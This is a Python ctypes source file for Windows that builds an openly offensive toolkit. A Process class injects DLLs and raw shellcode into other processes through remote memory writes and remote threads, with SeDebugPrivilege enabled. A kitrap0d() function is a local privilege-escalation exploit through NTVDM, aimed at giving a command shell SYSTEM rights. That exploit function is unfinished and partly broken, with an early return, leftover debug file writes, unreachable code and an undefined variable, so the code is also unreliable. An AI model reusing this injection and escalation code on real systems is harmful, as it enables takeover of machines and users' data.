import ctypes
import ctypes.wintypes as wintypes
import platform
import binascii
import os

wintypes.LPTSTR = ctypes.POINTER(ctypes.c_char)
wintypes.LPBYTE = ctypes.POINTER(ctypes.c_ubyte)
wintypes.HANDLE = ctypes.c_void_p

class __LUID(ctypes.Structure):
    """see: 
http://msdn.microsoft.com/en-us/library/windows/desktop/aa379261(v=vs.85).aspx
"""
    _fields_ = [("LowPart", wintypes.DWORD),
              ("HighPart", wintypes.LONG),]
wintypes.LUID = __LUID
class __LUID_AND_ATTRIBUTES(ctypes.Structure):
    """see: 
http://msdn.microsoft.com/en-us/library/windows/desktop/aa379263(v=vs.85).aspx
"""
    _fields_ = [("Luid",        wintypes.LUID),
        ("Attributes",  wintypes.DWORD),]
wintypes.LUID_AND_ATTRIBUTES = __LUID_AND_ATTRIBUTES
class __TOKEN_PRIVILEGES(ctypes.Structure):
    """see: 
http://msdn.microsoft.com/en-us/library/windows/desktop/aa379630(v=vs.85).aspx
"""
    _fields_ = [("PrivilegeCount",  wintypes.DWORD),
        ("Privileges",      wintypes.LUID_AND_ATTRIBUTES),]
wintypes.TOKEN_PRIVILEGES = __TOKEN_PRIVILEGES
class __STARTUPINFO(ctypes.Structure):
    """see: 
http://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
"""
    _fields_ = [("cb",            wintypes.DWORD),        
                ("lpReserved",    wintypes.LPTSTR), 
                ("lpDesktop",     wintypes.LPTSTR),  
                ("lpTitle",       wintypes.LPTSTR),
                ("dwX",           wintypes.DWORD),
                ("dwY",           wintypes.DWORD),
                ("dwXSize",       wintypes.DWORD),
                ("dwYSize",       wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute",wintypes.DWORD),
                ("dwFlags",       wintypes.DWORD),
                ("wShowWindow",   wintypes.WORD),
                ("cbReserved2",   wintypes.WORD),
                ("lpReserved2",   wintypes.LPBYTE),
                ("hStdInput",     wintypes.HANDLE),
                ("hStdOutput",    wintypes.HANDLE),
                ("hStdError",     wintypes.HANDLE),]
wintypes.STARTUPINFO = __STARTUPINFO
class __PROCESS_INFORMATION(ctypes.Structure):
    """see: 
http://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
"""
    _fields_ = [("hProcess",    wintypes.HANDLE),
                ("hThread",     wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId",  wintypes.DWORD),]
wintypes.PROCESS_INFORMATION = __PROCESS_INFORMATION
class __SYSTEM_MODULE_INFORMATION(ctypes.Structure):
	_fields_ = [("ModuleCount",		wintypes.ULONG),
		("WhoCares",		ctypes.c_void_p * 2),
		("BaseAddress",		ctypes.c_void_p),
		("Size",		wintypes.ULONG),
		("MoarStuff",		wintypes.ULONG),
		("MoarMoar",		wintypes.USHORT),
		("HeyThere",		wintypes.USHORT),
		("Pwned",		wintypes.USHORT),
		("W00t",		wintypes.USHORT),
		("ImageName",		ctypes.c_char * 256),]
wintypes.SYSTEM_MODULE_INFORMATION = __SYSTEM_MODULE_INFORMATION
class __IMAGE_DOS_HEADER(ctypes.Structure):
        _fields_ = [("e_magic",    wintypes.WORD),
                    ("e_cblp",     wintypes.WORD),
                    ("e_cp",       wintypes.WORD),
                    ("e_crlc",     wintypes.WORD),
                    ("e_cparhdr",  wintypes.WORD),
                    ("e_minalloc", wintypes.WORD),
                    ("e_maxalloc", wintypes.WORD),
                    ("e_ss",       wintypes.WORD),
                    ("e_sp",       wintypes.WORD),
                    ("e_csum",     wintypes.WORD),
                    ("e_ip",       wintypes.WORD),
                    ("e_cs",       wintypes.WORD),
                    ("e_lfarlc",   wintypes.WORD),
                    ("e_ovno",     wintypes.WORD),
                    ("e_res",      wintypes.WORD * 4),
                    ("e_oemid",    wintypes.WORD),
                    ("e_oeminfo",  wintypes.WORD),
                    ("e_res2",     wintypes.WORD * 10),
                    ("e_lfanew",   wintypes.LONG),]
wintypes.IMAGE_DOS_HEADER = __IMAGE_DOS_HEADER
class __IMAGE_FILE_HEADER(ctypes.Structure):
        _fields_ = [("Machine",              wintypes.WORD),
                    ("NumberOfSections",     wintypes.WORD),
                    ("TimeDateStamp",        wintypes.DWORD),
                    ("PointerToSymbolTable", wintypes.DWORD),
                    ("NumberOfSymbols",      wintypes.DWORD),
                    ("SizeOfOptionalHeader", wintypes.WORD),
                    ("Characteristics",      wintypes.WORD),]
wintypes.IMAGE_FILE_HEADER = __IMAGE_FILE_HEADER
class __IMAGE_DATA_DIRECTORY(ctypes.Structure):
        _fields_ = [("VirtualAddress", wintypes.DWORD),
                    ("Size",           wintypes.DWORD),]
wintypes.IMAGE_DATA_DIRECTORY = __IMAGE_DATA_DIRECTORY
class __IMAGE_OPTIONAL_HEADER(ctypes.Structure):
        _fields_ = [("Magic",                        wintypes.WORD),
                    ("MajorLinkerVersion",           wintypes.BYTE),
                    ("MinorLinkerVersion",           wintypes.BYTE),
                    ("SizeOfCode",                   wintypes.DWORD),
                    ("SizeOfInitializedData",        wintypes.DWORD),
                    ("SizeOfUninitializedData",      wintypes.DWORD),
                    ("AddressOfEntryPoint",          wintypes.DWORD),
                    ("BaseOfCode",                   wintypes.DWORD),
                    ("BaseOfData",                   wintypes.DWORD),
                    ("ImageBase",                    wintypes.DWORD),
                    ("SectionAlignment",             wintypes.DWORD),
                    ("FileAlignment",                wintypes.DWORD),
                    ("MajorOperatingSystemVersion",  wintypes.WORD),
                    ("MinorOperatingSystemVersion",  wintypes.WORD),
                    ("MajorImageVersion",            wintypes.WORD),
                    ("MinorImageVersion",            wintypes.WORD),
                    ("MajorSubsystemVersion",        wintypes.WORD),
                    ("MinorSubsystemVersion",        wintypes.WORD),
                    ("Win32VersionValue",            wintypes.DWORD),
                    ("SizeOfImage",                  wintypes.DWORD),
                    ("SizeOfHeaders",                wintypes.DWORD),
                    ("CheckSum",                     wintypes.DWORD),
                    ("Subsystem",                    wintypes.WORD),
                    ("DllCharacteristics",           wintypes.WORD),
                    ("SizeOfStackReserve",           wintypes.DWORD),
                    ("SizeOfStackCommit",            wintypes.DWORD),
                    ("SizeOfHeapReserve",            wintypes.DWORD),
                    ("SizeOfHeapCommit",             wintypes.DWORD),
                    ("LoaderFlags",                  wintypes.DWORD),
                    ("NumberOfRvaAndSizes",          wintypes.DWORD),
                    ("DataDirectory",                wintypes.IMAGE_DATA_DIRECTORY * 16),]
wintypes.IMAGE_OPTIONAL_HEADER = __IMAGE_OPTIONAL_HEADER
class __IMAGE_NT_HEADER(ctypes.Structure):
        _fields_ = [("Signature", wintypes.DWORD),
                    ("FileHeader", wintypes.IMAGE_FILE_HEADER),
                    ("OptionalHeader", wintypes.IMAGE_OPTIONAL_HEADER),]
wintypes.IMAGE_NT_HEADER = __IMAGE_NT_HEADER

class Process():
    """This class can be used for dll or shellcode injection.
Process(pid=pid)
This will attach to process with pid=pid assuming
you have proper privileges

Process(pe=path)
Starts the executable at path

self.inject(dllpath)
Injects dll at dllpath

self.injectshellcode(shellcode)
Injects raw shellcode in the string shellcode

self.terminate(code)
This will terminate the process in use regardless of where it was
started from. code is the exit code"""
    def __init__(self, pid=None, pe=None, handle=None):
        self.kernel32 = ctypes.windll.kernel32
        self.PROCESS_ALL_ACCESS = (0x000F0000L|0x00100000L|0xFFF)
        self.SE_DEBUG_NAME = "SeDebugPrivilege"
        self.TOKEN_ADJUST_PRIVILEGES = 0x20
        self.SE_PRIVILEGE_ENABLED = 0x00000002
        self.request_debug_privileges()
             
        if pid: #attach to current file
            self.handle = self.kernel32.OpenProcess(
                                                    self.PROCESS_ALL_ACCESS,
                                                    False,
                                                    pid
                                                    )
        elif pe: #create new process
            startupinfo = wintypes.STARTUPINFO()
            process_information = wintypes.PROCESS_INFORMATION()
            startupinfo.dwFlags = 0x1
            startupinfo.wShowWindow = 0x0
            startupinfo.cb = ctypes.sizeof(startupinfo)
            self.kernel32.CreateProcessA(
                                        pe,
                                        None,
                                        None,
                                        None,
                                        True,
                                        0,
                                        None,
                                        None,
                                        ctypes.byref(startupinfo),
                                        ctypes.byref(process_information)
                                        )
            self.handle = process_information.hProcess
        elif handle:
            self.handle = handle
        else:
            return None
                  
        self.arch = platform.architecture()[0][:2]
        if self.arch == 32:
            self.addrlen = 4
        else:
            self.addrlen = 8

    def request_debug_privileges(self):
        """Adds SeDebugPrivilege to current process for various needs"""
        privs = wintypes.LUID()
        ctypes.windll.advapi32.LookupPrivilegeValueW(
                                                    None,
                                                    self.SE_DEBUG_NAME,
                                                    ctypes.byref(privs)
                                                    )
        token = wintypes.TOKEN_PRIVILEGES(
                                            1,
                                            wintypes.LUID_AND_ATTRIBUTES(
                                                                        privs,
                                                                        self.SE_PRIVILEGE_ENABLED
                                                                        )
                                            )
        hToken = wintypes.HANDLE()
        ctypes.windll.advapi32.OpenProcessToken(
                                                self.kernel32.GetCurrentProcess(),
                                                self.TOKEN_ADJUST_PRIVILEGES,
                                                ctypes.byref(hToken)
                                                )
        ctypes.windll.advapi32.AdjustTokenPrivileges(
                                                    hToken,
                                                    False,
                                                    ctypes.byref(token),
                                                    0x0,
                                                    None,
                                                    None
                                                    )
        ctypes.windll.kernel32.CloseHandle(hToken)

    def inject(self, dllpath): #inject dllpath into our process
        """this function creates the following code:
<dll path in unicode>
push <address of dll path>
mov eax, kernel32.LoadLibaryW
call eax
mov eax, kernel32.ExitThread
push 0
call eax

and then executes it
"""
        dllpath = os.path.abspath(dllpath)
        push = "\x68"
        dllpath = "\x00".join(list(dllpath))+"\x00\x00\x00" 
        #convert to null padded unicode

        kernel32handle = self.kernel32.GetModuleHandleA("kernel32.dll")
        loadlibraryaddress = hex(self.kernel32.GetProcAddress(
                                 kernel32handle, "LoadLibraryW"))[2:]
        loadlibrarycall = "\xb8" #mov eax, 
        loadlibrarycall += binascii.unhexlify(loadlibraryaddress)[::-1] #addr
        loadlibrarycall += "\xff\xd0" #call eax

        exitaddress = binascii.unhexlify(hex(self.kernel32.GetProcAddress(
                                       kernel32handle, "ExitThread"))[2:])[::-1]
        exitcall = "\xb8"+exitaddress+"\x6a\x00\xff\xd0" 
        #mov eax, push zero and call exitthread
    
        loadlibrarycall += exitcall #put calls together
        loaddll = dllpath+push

        codelen = len(loaddll+loadlibrarycall)+self.addrlen
        #this is full code size for allocation

        shellcodeaddress = self.kernel32.VirtualAllocEx(
                                                        self.handle,
                                                        None,
                                                        codelen,
                                                        0x1000,
                                                        0x40
                                                        )
        #final shellcode in order with the start address of the path:
        loaddll += binascii.unhexlify(hex(shellcodeaddress)[2:].rjust(self.addrlen,"0"))[::-1]
        loaddll += loadlibrarycall
        self.kernel32.WriteProcessMemory(
                                        self.handle,
                                        shellcodeaddress,
                                        loaddll,
                                        len(loaddll),
                                        None
                                        )
        thread = self.kernel32.CreateRemoteThread(
                                        self.handle,
                                        None,
                                        0,
                                        shellcodeaddress+len(dllpath),
                                        None,
                                        0,
                                        None
                                        )
        self.kernel32.WaitForSingleObject(
                                        thread,
                                        -1
                                        )
        self.kernel32.VirtualFreeEx(
                                    self.handle,
                                    shellcodeaddress,
                                    len(loaddll),
                                    0x8000
                                    )

    def injectshellcode(self, shellcode):
        """This function merely executes what it is given"""
        shellcodeaddress = self.kernel32.VirtualAllocEx(
                                                        self.handle,
                                                        None,
                                                        len(shellcode),
                                                        0x1000,
                                                        0x40
                                                        )
        self.kernel32.WriteProcessMemory(
                                        self.handle,
                                        shellcodeaddress,
                                        shellcode,
                                        len(shellcode),
                                        None
                                        )
        thread = self.kernel32.CreateRemoteThread(
                                        self.handle,
                                        None,
                                        0,
                                        shellcodeaddress,
                                        None,
                                        0,
                                        None
                                        )

    def injectshellcodefromfile(self, file):
        """This function merely executes what it is given as a raw file"""
        fh=open(file,'rb')
        shellcode=fh.read()
        fh.close()
        self.injectshellcode(shellcode)

    def terminate(self, code=0):
        """This function terminates the process from the current handle"""
        self.kernel32.TerminateProcess(
                                        self.handle,
                                        code
                                        )
        self.kernel32.CloseHandle(self.handle)


def get_kernel_addr():
    ntdll = ctypes.windll.ntdll
    buffer_size = wintypes.ULONG(0)
    ntdll.ZwQuerySystemInformation(11, 0, 0, ctypes.byref(buffer_size));

    sysmod_info = ctypes.create_string_buffer(buffer_size.value)
    ntdll.ZwQuerySystemInformation(11, ctypes.byref(sysmod_info), buffer_size.value, ctypes.byref(buffer_size));
	
    mod_list = ctypes.cast(sysmod_info, ctypes.POINTER(wintypes.SYSTEM_MODULE_INFORMATION))
    return (mod_list[0].BaseAddress, mod_list[0].ImageName.split('\\')[-1], mod_list[0].Size)

def kitrap0d():
    kernel32 = ctypes.windll.kernel32
    
    startupinfo = wintypes.STARTUPINFO()
    process_information = wintypes.PROCESS_INFORMATION()
    startupinfo.dwFlags = 0x1
    startupinfo.wShowWindow = 0x1
    startupinfo.cb = ctypes.sizeof(startupinfo)
    kernel32.CreateProcessA(
                            "C:\\WINDOWS\\system32\\cmd.exe",
                            "C:\\WINDOWS\\system32\\cmd.exe",
                            None,
                            None,
                            False,
                            0x00000010,
                            None,
                            None,
                            ctypes.byref(startupinfo),
                            ctypes.byref(process_information)
                            )
    givesys = process_information.dwProcessId

    kernbase, kernimage, kernsize = get_kernel_addr()
    kernhandle = kernel32.LoadLibraryA(kernimage)
    xpsig = "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84"
    dos_header = ctypes.cast(kernhandle, ctypes.POINTER(wintypes.IMAGE_DOS_HEADER))
    nt_header = ctypes.cast(kernhandle + dos_header.contents.e_lfanew, ctypes.POINTER(wintypes.IMAGE_NT_HEADER))
    optional_header = nt_header.contents.OptionalHeader
    baseofcode = optional_header.BaseOfCode
    sizeofcode = optional_header.SizeOfCode
    #search between kernelhandle[baseofcode] - kernelhandle[baseofcode+sizeofcode] for xpsig
    buf = ctypes.c_byte*kernsize
    kernelarray = ctypes.cast(kernhandle, ctypes.POINTER(buf)).contents
    fh=open("E:\\file.exe",'wb')
    kernelarray = kernelarray[:]
    kernelarray = [chr(abs(i)) for i in kernelarray]
    return kernelarray
    fh.close()
    #for i in range(0,kernsize):
    #    chunk = ''.join([chr(abs(i)) for i in kernelarray[i:i+len(xpsig)]])
    #    if chunk == xpsig:
    #        continue
    return i
    
    

    kernel32.SetEnvironmentVariable("VDM_TARGET_PID",hex(givesys))
    kernel32.SetEnvironmentVariable("VDM_TARGET_KRN",hex(kernbase))
    kernel32.SetEnvironmentVariable("VDM_TARGET_OFF",hex(kernoff))

    startupinfo = wintypes.STARTUPINFO()
    process_information = wintypes.PROCESS_INFORMATION()
    startupinfo.dwFlags = 0x1
    startupinfo.wShowWindow = 0x0
    startupinfo.cb = ctypes.sizeof(startupinfo)
    kernel32.CreateProcessA(
                            "C:\\WINDOWS\\system32\\debug.exe",
                            None,
                            None,
                            None,
                            True,
                            0x00000004,
                            None,
                            None,
                            ctypes.byref(startupinfo),
                            ctypes.byref(process_information)
                            )
    ntvdm = kernel32.OpenProcess(
                        0x43b,
                        False,
                        process_information.dwProcessId
                        )
    
    ntvdminject = Process(handle=ntvdm)
    ntvdminject.inject("vdmallowed.dll")
